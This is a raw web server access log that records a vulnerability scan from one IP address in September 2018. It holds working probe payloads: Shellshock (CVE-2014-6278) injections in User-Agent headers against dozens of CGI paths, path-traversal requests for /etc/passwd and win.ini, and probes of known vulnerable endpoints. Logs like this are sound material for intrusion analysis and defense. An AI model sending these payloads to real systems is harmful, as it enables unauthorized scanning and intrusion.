216.47.150.102 - - [26/Sep/2018:15:53:10 -0500] "GET /cgi-bin/FormHandler.cgi HTTP/1.1" 404 178 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \x22bash_cve_2014_6278 Output : $((34+1))\x22; }"
216.47.150.102 - - [26/Sep/2018:15:53:10 -0500] "GET /cgi-bin/FormMail.cgi HTTP/1.1" 404 178 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \x22bash_cve_2014_6278 Output : $((34+1))\x22; }"
216.47.150.102 - - [26/Sep/2018:15:53:10 -0500] "GET /cgi-bin/guestbook.cgi HTTP/1.1" 404 178 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \x22bash_cve_2014_6278 Output : $((34+1))\x22; }"
216.47.150.102 - - [26/Sep/2018:15:53:10 -0500] "GET /cgi-bin/help.cgi HTTP/1.1" 404 178 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \x22bash_cve_2014_6278 Output : $((34+1))\x22; }"
216.47.150.102 - - [26/Sep/2018:15:53:10 -0500] "GET /cgi-bin/hi HTTP/1.1" 404 178 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \x22bash_cve_2014_6278 Output : $((34+1))\x22; }"
216.47.150.102 - - [26/Sep/2018:15:53:10 -0500] "GET /cgi-bin/index.cgi HTTP/1.1" 404 178 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \x22bash_cve_2014_6278 Output : $((34+1))\x22; }"
216.47.150.102 - - [26/Sep/2018:15:53:11 -0500] "GET /cgi-bin/index.pl HTTP/1.1" 404 178 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \x22bash_cve_2014_6278 Output : $((34+1))\x22; }"
216.47.150.102 - - [26/Sep/2018:15:53:11 -0500] "GET /cgi-bin/index.sh HTTP/1.1" 404 178 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \x22bash_cve_2014_6278 Output : $((34+1))\x22; }"
216.47.150.102 - - [26/Sep/2018:15:53:11 -0500] "GET /cgi-bin/mailit.pl HTTP/1.1" 404 178 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \x22bash_cve_2014_6278 Output : $((34+1))\x22; }"
216.47.150.102 - - [26/Sep/2018:15:53:11 -0500] "GET /cgi-bin/mt/mt-check.cgi HTTP/1.1" 404 178 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \x22bash_cve_2014_6278 Output : $((34+1))\x22; }"
216.47.150.102 - - [26/Sep/2018:15:53:11 -0500] "GET /cgi-bin/mt/mt-load.cgi HTTP/1.1" 404 178 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \x22bash_cve_2014_6278 Output : $((34+1))\x22; }"
216.47.150.102 - - [26/Sep/2018:15:53:11 -0500] "GET /cgi-bin/mt-static/mt-check.cgi HTTP/1.1" 404 178 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \x22bash_cve_2014_6278 Output : $((34+1))\x22; }"
216.47.150.102 - - [26/Sep/2018:15:53:11 -0500] "GET /cgi-bin/mt-static/mt-load.cgi HTTP/1.1" 404 178 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \x22bash_cve_2014_6278 Output : $((34+1))\x22; }"
216.47.150.102 - - [26/Sep/2018:15:53:11 -0500] "GET /cgi-bin/ncbook/book.cgi HTTP/1.1" 404 178 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \x22bash_cve_2014_6278 Output : $((34+1))\x22; }"
216.47.150.102 - - [26/Sep/2018:15:53:11 -0500] "GET /cgi-bin/quickstore.cgi HTTP/1.1" 404 178 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \x22bash_cve_2014_6278 Output : $((34+1))\x22; }"
216.47.150.102 - - [26/Sep/2018:15:53:11 -0500] "GET /cgi-bin/search HTTP/1.1" 404 178 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \x22bash_cve_2014_6278 Output : $((34+1))\x22; }"
216.47.150.102 - - [26/Sep/2018:15:53:11 -0500] "GET /cgi-bin/search.cgi HTTP/1.1" 404 178 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \x22bash_cve_2014_6278 Output : $((34+1))\x22; }"
216.47.150.102 - - [26/Sep/2018:15:53:11 -0500] "GET /cgi-bin/search/search.cgi HTTP/1.1" 404 178 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \x22bash_cve_2014_6278 Output : $((34+1))\x22; }"
216.47.150.102 - - [26/Sep/2018:15:53:11 -0500] "GET /cgi-bin/test.cgi HTTP/1.1" 404 178 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \x22bash_cve_2014_6278 Output : $((34+1))\x22; }"
216.47.150.102 - - [26/Sep/2018:15:53:11 -0500] "GET /cgi-bin/test.sh HTTP/1.1" 404 178 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \x22bash_cve_2014_6278 Output : $((34+1))\x22; }"
216.47.150.102 - - [26/Sep/2018:15:53:11 -0500] "GET /cgi-bin/test-cgi HTTP/1.1" 404 178 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \x22bash_cve_2014_6278 Output : $((34+1))\x22; }"
216.47.150.102 - - [26/Sep/2018:15:53:11 -0500] "GET /cgi-bin/upload.cgi HTTP/1.1" 404 178 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \x22bash_cve_2014_6278 Output : $((34+1))\x22; }"
216.47.150.102 - - [26/Sep/2018:15:53:11 -0500] "GET /cgi-bin/urlcount.cgi HTTP/1.1" 404 178 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \x22bash_cve_2014_6278 Output : $((34+1))\x22; }"
216.47.150.102 - - [26/Sep/2018:15:53:11 -0500] "GET /cgi-bin/viewcvs.cgi HTTP/1.1" 404 178 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \x22bash_cve_2014_6278 Output : $((34+1))\x22; }"
216.47.150.102 - - [26/Sep/2018:15:53:11 -0500] "GET /cgi-bin/wa HTTP/1.1" 404 178 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \x22bash_cve_2014_6278 Output : $((34+1))\x22; }"
216.47.150.102 - - [26/Sep/2018:15:53:11 -0500] "GET /cgi-bin/wa.cgi HTTP/1.1" 404 178 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \x22bash_cve_2014_6278 Output : $((34+1))\x22; }"
216.47.150.102 - - [26/Sep/2018:15:53:11 -0500] "GET /cgi-bin/wa.exe HTTP/1.1" 404 178 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \x22bash_cve_2014_6278 Output : $((34+1))\x22; }"
216.47.150.102 - - [26/Sep/2018:15:53:11 -0500] "GET /cgi-bin/whois.cgi HTTP/1.1" 404 178 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \x22bash_cve_2014_6278 Output : $((34+1))\x22; }"
216.47.150.102 - - [26/Sep/2018:15:53:11 -0500] "GET /cgi-bin-sdb/printenv HTTP/1.1" 404 178 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \x22bash_cve_2014_6278 Output : $((34+1))\x22; }"
216.47.150.102 - - [26/Sep/2018:15:53:11 -0500] "GET /cgi-mod/index.cgi HTTP/1.1" 404 178 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \x22bash_cve_2014_6278 Output : $((34+1))\x22; }"
216.47.150.102 - - [26/Sep/2018:15:53:11 -0500] "GET /cgi-sys/defaultwebpage.cgi HTTP/1.1" 404 178 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \x22bash_cve_2014_6278 Output : $((34+1))\x22; }"
216.47.150.102 - - [26/Sep/2018:15:53:11 -0500] "GET /cgi-sys/entropysearch.cgi HTTP/1.1" 404 178 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \x22bash_cve_2014_6278 Output : $((34+1))\x22; }"
216.47.150.102 - - [26/Sep/2018:15:53:11 -0500] "GET /index.cgi HTTP/1.1" 404 178 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \x22bash_cve_2014_6278 Output : $((34+1))\x22; }"
216.47.150.102 - - [26/Sep/2018:15:53:11 -0500] "GET /index.pl HTTP/1.1" 404 178 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \x22bash_cve_2014_6278 Output : $((34+1))\x22; }"
216.47.150.102 - - [26/Sep/2018:15:53:11 -0500] "GET /index.sh HTTP/1.1" 404 178 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \x22bash_cve_2014_6278 Output : $((34+1))\x22; }"
216.47.150.102 - - [26/Sep/2018:15:53:11 -0500] "GET /nph-mr.cgi HTTP/1.1" 404 178 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \x22bash_cve_2014_6278 Output : $((34+1))\x22; }"
216.47.150.102 - - [26/Sep/2018:15:53:11 -0500] "GET /query.cgi HTTP/1.1" 404 178 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \x22bash_cve_2014_6278 Output : $((34+1))\x22; }"
216.47.150.102 - - [26/Sep/2018:15:53:11 -0500] "GET /session_login.cgi HTTP/1.1" 404 178 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \x22bash_cve_2014_6278 Output : $((34+1))\x22; }"
216.47.150.102 - - [26/Sep/2018:15:53:11 -0500] "GET /show_bug.cgi HTTP/1.1" 404 178 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \x22bash_cve_2014_6278 Output : $((34+1))\x22; }"
216.47.150.102 - - [26/Sep/2018:15:53:11 -0500] "GET /test HTTP/1.1" 404 178 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \x22bash_cve_2014_6278 Output : $((34+1))\x22; }"
216.47.150.102 - - [26/Sep/2018:15:53:11 -0500] "GET /test.cgi HTTP/1.1" 404 178 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \x22bash_cve_2014_6278 Output : $((34+1))\x22; }"
216.47.150.102 - - [26/Sep/2018:15:53:11 -0500] "GET /ucsm/isSamInstalled.cgi HTTP/1.1" 404 178 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \x22bash_cve_2014_6278 Output : $((34+1))\x22; }"
216.47.150.102 - - [26/Sep/2018:15:53:12 -0500] "GET /whois.cgi HTTP/1.1" 404 178 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \x22bash_cve_2014_6278 Output : $((34+1))\x22; }"
216.47.150.102 - - [26/Sep/2018:15:53:12 -0500] "GET /wp-login.php HTTP/1.1" 404 178 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \x22bash_cve_2014_6278 Output : $((34+1))\x22; }"
216.47.150.102 - - [26/Sep/2018:15:53:12 -0500] "GET /wwwadmin.cgi HTTP/1.1" 404 178 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \x22bash_cve_2014_6278 Output : $((34+1))\x22; }"
216.47.150.102 - - [26/Sep/2018:15:53:12 -0500] "GET /wwwboard.cgi HTTP/1.1" 404 178 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \x22bash_cve_2014_6278 Output : $((34+1))\x22; }"
216.47.150.102 - - [26/Sep/2018:15:53:12 -0500] "GET /xampp/cgi.cgi HTTP/1.1" 404 178 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \x22bash_cve_2014_6278 Output : $((34+1))\x22; }"
216.47.150.102 - - [26/Sep/2018:15:53:12 -0500] "GET / HTTP/1.1" 301 194 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:12 -0500] "GET / HTTP/1.1" 301 194 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:12 -0500] "POST http://127.0.0.1/iControl/iControlPortal.cgi HTTP/1.1" 301 194 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:12 -0500] "GET / HTTP/1.1" 200 42550 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:12 -0500] "GET / HTTP/1.1" 200 42550 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:12 -0500] "POST http://127.0.0.1/iControl/iControlPortal.cgi HTTP/1.1" 404 580 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:12 -0500] "GET /.anydomain.test HTTP/1.0" 301 194 "-" "-"
216.47.150.102 - - [26/Sep/2018:15:53:12 -0500] "GET /.anydomain.test HTTP/1.0" 404 178 "-" "-"
216.47.150.102 - - [26/Sep/2018:15:53:13 -0500] "GET /xsql/demo/airport/airport.xsql?xml-stylesheet=none HTTP/1.1" 301 194 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:13 -0500] "GET /xsql/demo/airport/airport.xsql?xml-stylesheet=none HTTP/1.1" 404 580 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:13 -0500] "GET / HTTP/1.1" 301 194 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:13 -0500] "GET / HTTP/1.1" 301 194 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:13 -0500] "GET /axis/DirectDownload.jsp HTTP/1.1" 301 194 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:13 -0500] "GET / HTTP/1.1" 200 42550 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:13 -0500] "GET / HTTP/1.1" 200 42550 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:13 -0500] "GET /axis/DirectDownload.jsp HTTP/1.1" 404 580 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:13 -0500] "GET / HTTP/1.1" 301 194 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:13 -0500] "GET / HTTP/1.1" 301 194 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:13 -0500] "GET /setup/setup-/../../log.jsp?log=info&mode=asc&lines=10 HTTP/1.1" 301 194 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:13 -0500] "GET / HTTP/1.1" 200 42550 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:13 -0500] "GET / HTTP/1.1" 200 42550 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:13 -0500] "GET /setup/setup-/../../log.jsp?log=info&mode=asc&lines=10 HTTP/1.1" 404 580 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:13 -0500] "GET / HTTP/1.1" 301 194 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:13 -0500] "GET / HTTP/1.1" 301 194 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:13 -0500] "GET /ifx/?LO=../../../../../etc/passwd HTTP/1.1" 301 194 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:14 -0500] "GET / HTTP/1.1" 200 42550 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:14 -0500] "GET / HTTP/1.1" 200 42550 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:14 -0500] "GET /ifx/?LO=../../../../../etc/passwd HTTP/1.1" 404 580 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:14 -0500] "GET /scripts/w3who.dll HTTP/1.1" 301 194 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:14 -0500] "GET /scripts/w3who.dll HTTP/1.1" 404 580 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:15 -0500] "GET / HTTP/1.1" 301 194 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:15 -0500] "GET / HTTP/1.1" 301 194 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:15 -0500] "POST /FormHandler.cgi HTTP/1.1" 301 194 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:15 -0500] "GET / HTTP/1.1" 200 42550 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:15 -0500] "GET / HTTP/1.1" 200 42550 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:15 -0500] "POST /FormHandler.cgi HTTP/1.1" 404 580 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:15 -0500] "GET /..\x5Cpixfir~1\x5Chow_to_login.html HTTP/1.1" 404 580 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:15 -0500] "GET /..\x5Cpixfir~1\x5Chow_to_login.html HTTP/1.1" 301 194 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:15 -0500] "GET /trace.axd HTTP/1.1" 301 194 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:15 -0500] "GET /trace.axd HTTP/1.1" 404 580 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:16 -0500] "GET /lcgi/sewse.nlm?sys:/novonyx/suitespot/docs/sewse/viewcode.jse+httplist+httplist/../../../../../system/autoexec.ncf HTTP/1.1" 301 194 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:16 -0500] "GET /lcgi/sewse.nlm?sys:/novonyx/suitespot/docs/sewse/viewcode.jse+httplist+httplist/../../../../../system/autoexec.ncf HTTP/1.1" 404 580 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:16 -0500] "GET / HTTP/1.1" 301 194 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:16 -0500] "GET / HTTP/1.1" 301 194 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:16 -0500] "GET / HTTP/1.1" 301 194 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:16 -0500] "GET / HTTP/1.1" 200 42550 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:16 -0500] "GET / HTTP/1.1" 200 42550 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:16 -0500] "GET / HTTP/1.1" 200 42550 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:16 -0500] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x01\xBF\x08\xF0\xDD\x1E\x0C#\xA0--\xE5d\xDA\x87>\xDAt8\xEAq\x8D\xFC\xE8*z\xA2v\xDAn\xE3\xD2\x88\x00\x00\x94\xC0\x14\xC0" 400 182 "-" "-"
216.47.150.102 - - [26/Sep/2018:15:53:16 -0500] "GET / HTTP/1.1" 200 42550 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:16 -0500] "GET / HTTP/1.1" 200 42550 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:16 -0500] "GET /db HTTP/1.1" 404 580 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:17 -0500] "GET /././.. HTTP/1.1" 301 194 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:17 -0500] "GET ././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../ HTTP/1.1" 400 182 "-" "-"
216.47.150.102 - - [26/Sep/2018:15:53:17 -0500] "GET /././.. HTTP/1.1" 301 194 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:17 -0500] "GET ././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../ HTTP/1.1" 400 182 "-" "-"
216.47.150.102 - - [26/Sep/2018:15:53:17 -0500] "GET / HTTP/1.1" 301 194 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:17 -0500] "GET / HTTP/1.1" 301 194 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:17 -0500] "POST / HTTP/1.1" 301 194 "-" "Fastream NETFile Server"
216.47.150.102 - - [26/Sep/2018:15:53:17 -0500] "GET / HTTP/1.1" 200 42550 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:17 -0500] "GET / HTTP/1.1" 200 42550 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:17 -0500] "POST / HTTP/1.1" 405 182 "-" "Fastream NETFile Server"
216.47.150.102 - - [26/Sep/2018:15:53:17 -0500] "GET / HTTP/1.1" 200 42550 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:17 -0500] "GET / HTTP/1.1" 200 42550 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:17 -0500] "GET /note.txt?F_notini=&T_note=&nomentreprise=blah&filenote=../../windows/win.ini HTTP/1.1" 404 580 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:17 -0500] "GET /note.txt?F_notini=&T_note=&nomentreprise=blah&filenote=../../winnt/win.ini HTTP/1.1" 404 580 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:17 -0500] "GET /note.txt?F_notini=&T_note=&nomentreprise=blah&filenote=../../windows/win.ini HTTP/1.1" 301 194 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:17 -0500] "GET /note.txt?F_notini=&T_note=&nomentreprise=blah&filenote=../../winnt/win.ini HTTP/1.1" 301 194 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:18 -0500] "GET / HTTP/1.1" 301 194 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:18 -0500] "GET / HTTP/1.1" 301 194 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:18 -0500] "GET /status.xsl. HTTP/1.1" 301 194 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:18 -0500] "GET / HTTP/1.1" 200 42550 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:18 -0500] "GET / HTTP/1.1" 200 42550 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:18 -0500] "GET /status.xsl. HTTP/1.1" 404 580 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
216.47.150.102 - - [26/Sep/2018:15:53:37 -0500] "GET /password HTTP/1.1" 400 182 "-" "-"
216.47.150.102 - - [26/Sep/2018:15:53:42 -0500] "GET / HTTP/1.1" 400 0 "-" "-"
216.47.150.102 - - [26/Sep/2018:15:53:42 -0500] "GET / HTTP/1.1" 301 194 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
